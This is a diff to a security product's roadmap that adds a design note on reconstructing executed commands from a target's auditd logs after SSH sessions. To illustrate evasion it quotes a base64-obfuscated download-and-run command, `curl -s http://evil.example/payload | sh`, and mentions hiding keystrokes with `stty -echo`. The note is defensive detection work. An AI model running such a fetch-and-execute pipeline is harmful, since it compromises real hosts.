@@ -6,7 +6,7 @@ Status: ✅ done · 🚧 in progress · ⬜ planned
 
 > 🟢 **Living document** — updated in the same change as the code, without a separate ask (see the [docs hub](docs/README.md)).
 
-**Phases 0–156 are shipped.** Phases 96–108 are a refactor, security-hardening
+**Phases 0–157 are shipped.** Phases 96–108 are a refactor, security-hardening
 and documentation-currency arc that sits on top of the feature work below:
 cross-path security-parity fixes (96), observability parity (97), shared-helper
 consolidation (98), store/API ergonomics (99), wiring readability (100), test
@@ -2418,6 +2418,151 @@ Deliberately **not** done: narrowing all 129 handlers. `api.Server` holds one
 store and uses most of it; rewriting every signature would be a large diff for
 little gain. The value is that a *new* consumer can now state its 3 methods, and
 two did.
+
+## Phase 157 — Post-session forensic reconstruction (the eBPF finding) ✅
+
+**Closes:** Teleport's Enhanced Session Recording — "audit-only forensic
+reconstruction of what actually ran inside a PTY, defeating base64-obfuscated
+and disabled-echo evasion after the fact" — the batch's last item, and the one
+whose *planned mechanism* did not survive contact with pamv1's architecture.
+The stated outcome is delivered; the stated mechanism is documented as
+permanently unavailable to a proxy, with the evidence for that claim.
+
+**The go/no-go, done first, exactly as Phase 129 did for RDP.** The plan called
+for eBPF (`cilium/ebpf`, Linux 5.8+, a CAP_BPF CI runner). Two findings, in
+order of severity:
+
+1. **Architectural, and decisive: an eBPF exec tracer on the pam-server host
+   would observe *zero* events for every brokered session.** pamv1 is a proxy —
+   an operator's shell runs on the TARGET, under the target's own sshd, in the
+   target's kernel. Verified rather than assumed: there is no `os/exec` anywhere
+   in this repo's production code (`grep -rl '"os/exec"'` hits two test files
+   and nothing else), the SSH proxy bridges channels to the target's sshd,
+   WinRM/Kubernetes run remotely, and the database proxies relay wire
+   protocols. Teleport's mechanism works because its SSH service *is* the sshd
+   on the node, so a session's processes are its own children. pamv1 has no such
+   foothold — with one narrow exception: the Phase 153 endpoint agent runs ON a
+   target, but only on opt-in endpoints, and even there kernel tracing would
+   need system-wide probes plus a socket → sshd-child → process-tree
+   correlation, plus a reporting path from agent to server that Phase 153
+   deliberately refused to open ("an agent may open NO channels toward pamv1").
+   That is a **permanent limitation of brokering**, not a gap a bigger CI runner
+   closes.
+2. **Environmental, and secondary:** this environment cannot load BPF at all —
+   `CapEff` is `0000000000000000`, `kernel.unprivileged_bpf_disabled=2`,
+   tracefs is unreadable, `perf_event_paranoid=4`, and there is no clang. Even
+   a blind, CI-only build could not be verified locally. On its own this would
+   have been an infrastructure gap; combined with (1) it is moot.
+
+**So the phase ships the honestly-buildable v1 of the same outcome** — the same
+move Phase 133 made when true TPM attestation turned out to need a client-side
+key-custody story that does not exist ("a materially different, honestly-
+buildable v1"), and Phase 143 made when whole-file ICAP scanning turned out to
+be detection rather than prevention. **Post-session forensic reconstruction:**
+when an interactive SSH session ends, pamv1 runs ONE fixed, read-only command
+over that target's own vaulted credential, on a FRESH connection (never the
+live session — Phase 128's established shape), pulls the TARGET's own kernel
+audit records, filters them to that session's window, and stores the result
+beside the recording as a hash-chained, audited artifact.
+
+**Why the target's audit subsystem is the right source.** It is fed by the same
+syscall hooks an eBPF probe would tap, it is already running on most hardened
+Linux fleets, and — the point of the whole phase — it records the argv **as
+executed**: an operator who types `echo Y3VybCA… | base64 -d | sh` leaves an
+innocuous line in the recording, while the kernel logs the decoded
+`curl -s http://evil.example/payload | sh` that actually ran. `stty -echo`
+hides the typing entirely and changes nothing about what the kernel saw.
+
+**Design decisions:**
+
+- **New leaf `internal/sessionforensics`** — pure parsing, no I/O, testable
+  against fixed sample text exactly like `internal/accountscan`. It handles all
+  three ways auditd encodes an argument: quoted, **hex** (used whenever an
+  argument contains a space or quote — decoding it is not cosmetic, it is
+  precisely where an obfuscated command line lives), and the **chunked**
+  `aN_len`/`aN[i]` form a long payload is split into (concatenated in index
+  order — the wrong order would silently corrupt evidence).
+- **The command is fixed and read-only**, not configurable: a remote command
+  string an operator could set is a policy hole, and this one runs with a
+  privileged vaulted credential. `ausearch -m EXECVE -ts today | tail -c
+  1048576` — `ausearch` because it follows log rotation; `-ts today` rather
+  than an exact window because ausearch's `-ts` takes a locale-formatted date
+  and building one on the target's locale is how a forensic tool starts lying,
+  so **the window is applied here** against each record's own epoch timestamp;
+  `tail -c` because a chatty target must not be able to flood the artifact.
+  stderr is deliberately NOT redirected away — the target's own "Permission
+  denied" is what turns an empty result into an honest UNAVAILABLE note. A test
+  pins that the literal stays read-only (no redirection, no `sudo`, no `;`).
+- **"Unavailable" is a finding, not silence.** A target with no auditd, exec
+  auditing off, or a credential that may not read the audit log produces
+  `session.forensics_unavailable` with the reason, and an artifact that says
+  UNAVAILABLE in as many words. "Nothing was recorded" and "nothing ran" must
+  never look the same — which is also why the artifact is written even for that
+  case.
+- **The window scopes the artifact to ONE session.** A target's audit log holds
+  every session's execs, including other operators'; bleeding a neighbour's
+  commands into this record would be worse than reporting nothing. Pinned by a
+  test with an out-of-window exec that must not appear.
+- **It only fires for sessions that ran something.** A connection that is
+  admitted and then closed without opening a session channel executed nothing,
+  so reconstructing it would be noise — and would run an extra command on the
+  target for no reason.
+- **A Zero Standing Privilege credential is refused, loudly.** Its session
+  certificate was minted for that session and is gone; minting a second one
+  here would be a fresh privileged access AFTER the session's approval was
+  consumed. That is an audited `session.forensics_unavailable`, not a quiet
+  widening of what a ZSP credential authorizes.
+- **pamv1's own literal is not exempt from policy**: the command goes through
+  the same `guardCommand` chokepoint as every other discrete command (Phase
+  38), so a deny pattern that happens to match refuses the collection — audited
+  as `command.blocked … path:forensics`.
+- **Off by default** (`PAM_SESSION_FORENSICS`): it runs an extra command on
+  every target after every session, which a site must consent to.
+- **The hook is a tracked background task** on the proxy's existing drain
+  WaitGroup, so a graceful shutdown waits for an in-flight collection instead
+  of leaving an artifact half-written and unaudited — pinned by a test that
+  holds a collection open and asserts `Serve` has not returned.
+
+**A call site Phase 155 missed, found here and fixed:** the recordings
+listing/playback name policy (`recordingNameRe`) accepted only
+`.cast|.winrm.log|.sftp`, so Phase 155's `.k8s.log` transcripts were written
+and audited but **invisible to the console and unreachable by the playback
+route**. Both new suffixes are now listed, classified (`transcript` /
+`forensics`) and servable, with a test that asserts an auditor can actually
+reach the evidence.
+
+**Proven end to end, twice over.** Package level: the three argv encodings, the
+window filter, ordering, the visible cap, the honest-unavailable shapes, a
+`tail -c`-cut leading record skipped rather than fatal, and the flagship — an
+obfuscated command whose decoded execve the reconstruction names in the clear.
+Proxy level: the hook fires with the right target/credential/actor/window,
+does NOT fire for a connection that opened no channel, drains on shutdown, and
+an end-to-end run where a session executes an obfuscated pipeline and the
+reconstruction (pulled over the same vaulted credential from a fake target
+serving fixture audit records) names what actually ran while another session's
+exec stays out. API level: the artifact's on-disk SHA-256 matches the audited
+one, the artifact carries no secret and states its own limits, unavailability
+is a finding, and the refusals (disabled, ZSP, command-blocked, non-SSH) never
+touch the target.
+
+**What stays open, stated plainly** (docs/EXTERNAL-INFRA-GAPS.md): kernel-level
+IN-session tracing, for the reasons above; it would require pamv1 to run on the
+target, which is a different product shape (an agent-based PAM) rather than a
+missing feature. This artifact is also only as trustworthy as the target's own
+logs — a root operator can tamper with them, exactly as they could unload an
+eBPF probe — and it depends on the target running auditd with exec auditing
+enabled, which the artifact says out loud when it is not.
+
+Full CI-gate sweep clean: `gofmt`, `go vet`, `staticcheck`, `gosec`,
+`govulncheck`, `go test -race ./...`, `go run ./cmd/archgen`. **No new
+dependency** (the parser is standard library) and **no schema change**.
+
+**Critical files:** new `internal/sessionforensics/sessionforensics.go`, new
+`internal/api/forensics_handlers.go`, `internal/proxy/proxy.go`
+(`OnSessionForensics`, `SessionForensics`, `fireForensics`, the
+interactive-channel gate), `internal/api/server.go` (options/fields),
+`internal/api/recordings_handlers.go` (the name-policy fix),
+`internal/config/config.go` (`PAM_SESSION_FORENSICS*`), `cmd/pam-server/main.go`.
 
 ## Phase 156 — v0.41.0 ✅
 
